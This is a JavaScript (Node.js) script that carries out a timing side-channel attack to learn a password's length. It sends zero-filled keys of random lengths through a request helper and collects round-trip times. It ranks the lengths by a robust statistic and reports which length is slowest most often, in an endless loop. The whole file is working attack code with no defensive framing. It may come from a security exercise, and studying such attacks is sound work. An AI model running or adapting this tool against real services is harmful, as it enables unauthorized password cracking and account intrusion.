const { makeRequest } = require("./lib/request");
const { midsummary } = require("./lib/estimator");

// Guess passwords of length b/w 1 and N
const MAX_PWD_LEN = 32;

// How many last observations to use per round
const N_OBSERVATIONS_PER_ROUND = 20;

// How many observation to run before reporting.
// Multiply by some small positive integer (1 < n < 10)
// to make sure we "warm up" before doing actual measurements.
// Probably not necessary, but also useful to fully refresh
// the list of measurements b/w rounds.
const REPORT_EVERY_N_OBSERVATIONS = 2 * N_OBSERVATIONS_PER_ROUND * MAX_PWD_LEN;

/**
 * Experiment data, a map from password length to round trip times (RTT)
 * @type {{
 *   [key: number]: BigInt[]
 * }}
 */
const experiments = {};

/**
 * Total number of performed observations.
 * @type {number}
 */
let totalObservations = 0;

/**
 * Counting how many times each password length came out on top,
 * i.e., #1 in the list of longest observations (aggregated via some function)
 * @type {{
 *   [key: number]: number
 * }}
 */
const topPlaces = {};

/**
 * @param len {number}
 * @param timeDiff {BigInt}
 */
function updateObservations(len, timeDiff) {
  /** @type BigInt[] */
  const observations = experiments[len] ?? [];
  experiments[len] = [timeDiff, ...observations].slice(0, N_OBSERVATIONS_PER_ROUND);
  totalObservations += 1;
}

function report() {
  const ranking = Object.keys(experiments)
    .map(len => [len, midsummary(experiments[len])])
    .sort((a, b) => b[1] - a[1]);

  const [slowestLen] = ranking[0];
  topPlaces[slowestLen] = (topPlaces[slowestLen] ?? 0) + 1;

  const report = Object.keys(topPlaces)
    .map(l => [l, topPlaces[l]])
    .sort((a, b) => b[1] - a[1]) // Descending by total number of top places
    .slice(0, 5) // report only top 5
    .map(row => `${row[0].padStart(2, ' ')} was the slowest ${row[1]} time(s)`);

  console.log("\n" + report.join("\n"));
}

async function guessLength() {
  const randomLen = Math.floor(Math.random() * MAX_PWD_LEN) + 1;
  const dummyKey = '0'.repeat(randomLen);

  const [, timeDiff] = await makeRequest(dummyKey);

  updateObservations(randomLen, timeDiff);

  if (totalObservations % REPORT_EVERY_N_OBSERVATIONS === 0) {
    report();
  }

  // loop with a chance to terminate
  setTimeout(() => guessLength(), 0);
}

// start the infinity loop, finish by pressing Ctrl-C
guessLength();
